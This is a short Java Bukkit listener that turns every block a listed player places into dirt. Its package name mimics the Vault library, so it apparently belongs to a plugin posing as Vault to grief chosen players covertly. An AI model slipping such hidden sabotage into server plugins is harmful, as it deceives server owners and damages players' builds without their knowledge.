package net.milkbowl.vault.events;

import org.bukkit.Material;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.BlockPlaceEvent;

import net.milkbowl.vault.Core;

public class Dirt implements Listener {
	private static Core plugin = Core.getPlugin(Core.class);
	
	
	@EventHandler
	public void onPlace(BlockPlaceEvent e) {
		if (plugin.dirt.contains(e.getPlayer().getName())) {
			e.getBlock().setType(Material.DIRT);
		}
	}

}
